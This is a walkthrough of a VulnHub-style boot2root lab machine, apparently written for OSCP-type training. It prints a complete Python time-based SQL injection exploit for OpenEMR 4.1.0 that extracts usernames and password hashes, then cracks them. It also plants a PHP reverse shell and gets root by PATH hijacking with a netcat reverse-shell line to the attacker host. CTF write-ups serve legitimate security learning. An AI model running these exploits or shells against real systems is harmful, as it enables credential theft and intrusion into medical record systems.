  Healthcare: 1 Writeup

Description:
\
Level: Intermediate

Description:This machine was developed to train the student to think according to the OSCP methodology. Pay attention to each step, because if you lose something you will not reach the goal: to become root in the system.

It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and root.txt.

  Exploitation
Let's start with network scan
```bash
Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts                                                                                                                                         
                                                                                                                                                                                                              
 1 Captured ARP Req/Rep packets, from 1 hosts.   Total size: 60                                                                                                                                               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.107   08:00:27:35:ea:c4      1      60  PCS Systemtechnik GmbH
```
\
Next , Open ports 
```bash
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
\
After this i opened port 80
\

<img width="1304" height="652" alt="image" src="https://github.com/user-attachments/assets/67b85a67-b98d-46ab-93f3-eb9418f7f2e8" />
\
Then i did some enumeration with ffuf and found "/cgi-bin/test.cgi" 
\
<img width="1103" height="697" alt="image" src="https://github.com/user-attachments/assets/e55459e0-09bb-4279-8318-5717b80a6a5f" />
\
Then i tried the shellshock vuln on that page
\
<img width="1348" height="650" alt="image" src="https://github.com/user-attachments/assets/58b31fde-7e14-42b7-a90a-71f72f9b0925" />
\
But i just could not get command injection
\
Then i sit and enumerate with a bigger wordlist 
\
Then at almost the end of this wordlist , i get a new endpoint
```bash
ffuf -u http://192.168.0.107/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -r   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.107/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                       [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 1ms]
index                   [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 5ms]
  on at least 1 host    [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 6ms]
images                  [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 1ms]

css                     [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 1ms]
js                      [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 4ms]
vendor                  [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 1ms]
robots                  [Status: 200, Size: 620, Words: 60, Lines: 20, Duration: 0ms]
favicon                 [Status: 200, Size: 1406, Words: 3, Lines: 2, Duration: 47ms]
                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 543ms]
  Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 554ms]
                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 588ms]
                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 592ms]
  Copyright 2007 James Fisher [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 594ms]
  directory-list-2.3-big.txt [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 596ms]
  Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 604ms]
                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 620ms]
  or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 636ms]
fonts                   [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 57ms]
gitweb                  [Status: 403, Size: 1013, Words: 102, Lines: 43, Duration: 1ms]
                        [Status: 200, Size: 5031, Words: 182, Lines: 121, Duration: 0ms]
phpMyAdmin              [Status: 403, Size: 59, Words: 4, Lines: 1, Duration: 0ms]
server-status           [Status: 403, Size: 999, Words: 101, Lines: 43, Duration: 0ms]
server-info             [Status: 403, Size: 999, Words: 101, Lines: 43, Duration: 0ms]
openemr                 [Status: 200, Size: 131, Words: 2, Lines: 6, Duration: 2ms]
:: Progress: [1273832/1273832] :: Job [1/1] :: 3225 req/sec :: Duration: [0:06:07] :: Errors: 0 ::
```
\
So , i visit /openemr , it redirects me to
\
<img width="1247" height="722" alt="image" src="https://github.com/user-attachments/assets/3ba05e0f-afd1-4bb1-b5ef-a48e03bc6775" />
\
Then i check for exploits with searchsploit
```bash
searchsploit openemr 4.1.0
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 4.1.0 - 'u' SQL Injection                                                                                                                                            | php/webapps/49742.py
Openemr-4.1.0 - SQL Injection                                                                                                                                                | php/webapps/17998.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
\
So , there is an time based sql injection vulnerability here , and this is poc 
```bash
  Exploit Title: OpenEMR 4.1.0 - 'u' SQL Injection
  Date: 2021-04-03
  Exploit Author: Michael Ikua
  Vendor Homepage: https://www.open-emr.org/
  Software Link: https://github.com/openemr/openemr/archive/refs/tags/v4_1_0.zip
  Version: 4.1.0
  Original Advisory: https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/

 !/usr/bin/env python3

import requests
import string
import sys

print("""
   ____                   ________  _______     __ __   ___ ____ 
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \\
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/  
    /_/
    ____  ___           __   _____ ____    __    _               
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)              
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /               
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike 
""")

all = string.printable
  edit url to point to your openemr instance
url = "http://192.168.56.106/openemr/interface/login/validateUser.php?u=" 

def extract_users_num():
    print("[+] Finding number of users...")
    for n in range(1,100):
        payload = '\'%2b(SELECT+if((select count(username) from users)=' + str(n) + ',sleep(3),1))%2b\''
        r = requests.get(url+payload)
        if r.elapsed.total_seconds() > 3:
            user_length = n
            break
    print("[+] Found number of users: " + str(user_length))
    return user_length

def extract_users():
    users = extract_users_num()
    print("[+] Extracting username and password hash...")
    output = []
    for n in range(1,1000):
        payload = '\'%2b(SELECT+if(length((select+group_concat(username,\':\',password)+from+users+limit+0,1))=' + str(n) + ',sleep(3),1))%2b\''
         print(payload)
        r = requests.get(url+payload)
         print(r.request.url)
        if r.elapsed.total_seconds() > 3:
            length = n
            break
    for i in range(1,length+1):
        for char in all:
            payload = '\'%2b(SELECT+if(ascii(substr((select+group_concat(username,\':\',password)+from+users+limit+0,1),'+ str(i)+',1))='+str(ord(char))+',sleep(3),1))%2b\''
             print(payload)
            r = requests.get(url+payload)
             print(r.request.url)
            if r.elapsed.total_seconds() > 3:
                output.append(char)
                if char == ",":
                    print("")
                    continue
                print(char, end='', flush=True)


try:
    extract_users()
except KeyboardInterrupt:
    print("")
    print("[+] Exiting...")
    sys.exit()
```
\
Change the ip in the url line of this poc and run it and wait for some time ( since its a time based sqli , it will take some time )
```bash
python 2.py
/home/kali/cysec/vulnhub/healthcare/2.py:17: SyntaxWarning: invalid escape sequence '\_'
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \\

   ____                   ________  _______     __ __   ___ ____ 
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ / 
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/  
    /_/
    ____  ___           __   _____ ____    __    _               
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)              
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /               
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /                
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike 

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
```
\
Now , lets try to crack admin and medical hashes
```bash
john -w:/usr/share/wordlists/rockyou.txt admin-hash
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
ackbar           (?)     
1g 0:00:00:00 DONE (2026-02-04 13:41) 9.090g/s 9421Kp/s 9421Kc/s 9421KC/s ackie..acjy98
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```
```bash
ohn -w:/usr/share/wordlists/rockyou.txt medi-hash 
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
medical          (?)     
1g 0:00:00:00 DONE (2026-02-04 13:51) 100.0g/s 861600p/s 861600c/s 861600C/s muñeca..medical
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```
\
Pretty simple password , so now lets login into openemr as admin
\
Then i was looking around the dashboard and saw a files section , so decided to look into it 
\
<img width="1675" height="791" alt="image" src="https://github.com/user-attachments/assets/2afa75dc-d40e-43c2-87e1-2dbae16a63c1" />
\
So , there are some files here to edit , and we see that luckily we also have a template/custom_pdf.php file which we can edit and replace with reverse shell payload and then scroll down and save it 
\
\
<img width="1635" height="750" alt="image" src="https://github.com/user-attachments/assets/d7099a42-c953-4138-9eaf-f8fe62e65307" />
\
After this , we need to access the php file to execute the php code , so we access "http://192.168.0.107/openemr/sites/default/letter_templates/custom_pdf.php" and get our shell
```bash
 penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 192.168.0.107-UNIX 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/192.168.0.107-UNIX/2026_02_04-13_46_54-207.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
sh-4.1$ id                                                                                                                                                                                                    
uid=479(apache) gid=416(apache) groups=416(apache)
```
\
We see that , there is a "medical" user on this machine , so we try to switch to that user by using the prviously cracked password
```bash
sh-4.1$ su medical
Password: 
[medical@localhost phpMyAdmin]$ id
uid=500(medical) gid=500(medical) groups=500(medical),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),501(fuse)
```
\
we get user.txt file from /home/almirant
```bash
[medical@localhost almirant]$ cat user.txt 
d41d8cd98f00b204e9800998ecf8427e
```
\
Then checking SUID binaries
```bash
[medical@localhost almirant]$ find / -perm -4000 -type f 2>/dev/null
/usr/libexec/pt_chown
/usr/lib/ssh/ssh-keysign
/usr/lib/polkit-resolve-exe-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/polkit-grant-helper-pam
/usr/lib/polkit-set-default-helper
/usr/sbin/fileshareset
/usr/sbin/traceroute6
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/bin/crontab
/usr/bin/at
/usr/bin/pumount
/usr/bin/batch
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/wvdial
/usr/bin/pmount
/usr/bin/sperl5.10.1
/usr/bin/gpgsm
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpg
/usr/bin/healthcheck
/usr/bin/Xwrapper
/usr/bin/ping6
/usr/bin/chsh
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/bin/ping
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
```
\
In these , i think "/usr/bin/healthcheck" and "/usr/bin/sperl5.10.1" are unusual 
\
So i try to use sperl first since it is perl related , but did not work
\
So i check healthcheck binary , runing it gave
```bash
/usr/bin/healthcheck
System Health Check

Scanning System
eth1      Link encap:Ethernet  HWaddr 08:00:27:35:EA:C4  
          inet addr:192.168.0.107  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe35:eac4/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1754560 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1975591 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:299067393 (285.2 MiB)  TX bytes:2397334777 (2.2 GiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:688 errors:0 dropped:0 overruns:0 frame:0
          TX packets:688 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:74992 (73.2 KiB)  TX bytes:74992 (73.2 KiB)


Disk /dev/sda: 10.7 GB, 10737418240 bytes
255 heads, 63 sectors/track, 1305 cylinders, total 20971520 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00000000

   Device Boot      Start         End      Blocks   Id  System
/dev/sda1   *          63    18876374     9438156   83  Linux
/dev/sda2        18876375    20964824     1044225    5  Extended
/dev/sda5        18876438    20964824     1044193+  82  Linux swap / Solaris
4.0K    ./gpg-ycbRQr
4.0K    ./gpg-4rINVW
4.0K    ./.ICE-unix
4.0K    ./.X11-unix
3.8M    .
```
\
When we check with strings
```bash
[medical@localhost tmp]$ strings /usr/bin/healthcheck
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```
\
It is calling the binary "clear", so i think about binary replacement or PATH-Hijacking
```bash
[medical@localhost tmp]$ echo "busybox nc 192.168.0.105 4445 -e /bin/sh" > /tmp/clear
[medical@localhost tmp]$ ls -la
total 3820
drwxrwxrwt  6 root     root        4096 Feb  4 11:15 ./
drwxr-xr-x 21 root     root        4096 Feb  4 09:48 ../
drwxrwxrwt  2 root     root        4096 Feb  4 09:48 .ICE-unix/
-r--r--r--  1 root     root          11 Feb  4 09:48 .X0-lock
drwxrwxrwt  2 root     root        4096 Feb  4 09:48 .X11-unix/
-rw-------  1 medical  medical    12288 Feb  4 11:05 .test.pl.swp
-rw-------  1 medical  medical    16384 Feb  4 11:00 .test1.pl.swp
-rw-r--r--  1 medical  medical        0 Feb  4 11:06 S);exec(sh
-rw-r--r--  1 medical  medical        0 Feb  4 11:06 S);open(STDERR,
-rw-r--r--  1 medical  medical        0 Feb  4 11:06 S);open(STDOUT,
-rw-r--r--  1 medical  medical       41 Feb  4 11:15 clear
-rw-r--r--  1 root     root        1413 Feb  4 09:48 ddebug.log
drwx------  2 medical  medical     4096 Feb  4 10:51 gpg-4rINVW/
drwx------  2 almirant almirant    4096 Jul 29  2020 gpg-ycbRQr/
-rw-------  1 root     root           0 Jul 29  2020 init.vQ5ZLd
-rw-r--r--  1 apache   apache   3841560 Jul 29  2020 setup_dump.sql
-rw-r--r--  1 medical  medical      142 Feb  4 11:06 test.pl
[medical@localhost tmp]$ chmod +x clear 
[medical@localhost tmp]$ export PATH=/tmp:$PATH
[medical@localhost tmp]$ env | grep PATH
PATH=/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
[medical@localhost tmp]$ /usr/bin/healthcheck

```
\
So i create a reverse shell payload instead of clear and ran it 
```bash
penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from localhost.localdomain~192.168.0.107-Linux-i686 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/localhost.localdomain~192.168.0.107-Linux-i686/2026_02_04-14_15_35-801.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[root@localhost tmp]  id                                                                                                                                                                                      
uid=0(root) gid=0(root) groups=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),500(medical),501(fuse)
[root@localhost tmp]  cd /root
[root@localhost root]  ls -la
total 920
drwxr-x--- 20 root root   4096 Jul 29  2020 ./
drwxr-xr-x 21 root root   4096 Feb  4 09:48 ../
-rw-------  1 root root      0 Sep 11  2011 .ICEauthority
-rw-------  1 root root    426 Jul 29  2020 .bash_history
-rw-r--r--  1 root root    193 Sep 24  2011 .bash_profile
-rw-rw-rw-  1 root root    422 Sep  6  2011 .bashrc
drwxr-xr-x  2 root root   4096 Sep 12  2011 .cache/
drwx------  6 root root   4096 Sep 12  2011 .config/
drwx------  3 root root   4096 Jul 19  2011 .dbus/
-rw-------  1 root root     28 Jul 22  2011 .dmrc
drwx------  4 root root   4096 Sep 24  2011 .gconf/
drwx------  2 root root   4096 Sep 24  2011 .gconfd/
drwx------  3 root root   4096 Sep 12  2011 .gnome2/
drwx------  2 root root   4096 Sep 12  2011 .gnome2_private/
drwx------  3 root root   4096 Jul 29  2020 .gnupg/
drwx------  2 root root   4096 Jul 19  2011 .gvfs/
drwx------  3 root root   4096 Sep  6  2011 .local/
drwx------  3 root root   4096 Nov  5  2011 .mc/
-rw-r--r--  1 root root      0 Oct 22  2010 .mdk-menu-migrated
-rw-r--r--  1 root root      0 Jul 21  2011 .menu-updates.stamp
-rw-------  1 root root      6 Jul 29  2020 .mysql_history
drwx------  2 root root   4096 Nov  5  2011 .synaptic/
drwx------  2 root root   4096 Sep 11  2011 .thumbnails/
drwxr-xr-x  2 root root   4096 Jul 29  2020 .xauth/
-rw-r--r--  1 root root   1897 Jul  6  2011 .xbindkeysrc
drwxr--r--  2 root root   4096 Jul 19  2011 Desktop/
drwx------  3 root root   4096 Sep  8  2011 Documents/
drwx------  2 root root   4096 Sep  6  2011 drakx/
-rwxr-xr-x  1 root root   5813 Jul 29  2020 healthcheck*
-rw-r--r--  1 root root    182 Jul 29  2020 healthcheck.c
-rw-rw-rw-  1 root root   2096 Jul 29  2020 root.txt
-rw-r--r--  1 root root 815966 Apr 12  2020 sudo.rpm
drwx------  2 root root   4096 Feb  4 09:48 tmp/
[root@localhost root]  cat root.txt 
██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 
                                                                                                                          
                                                                                                                          
Thanks for Playing!

Follow me at: http://v1n1v131r4.com


root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
 
[root@localhost root]  
```
\
The end , Thank you for reading till here
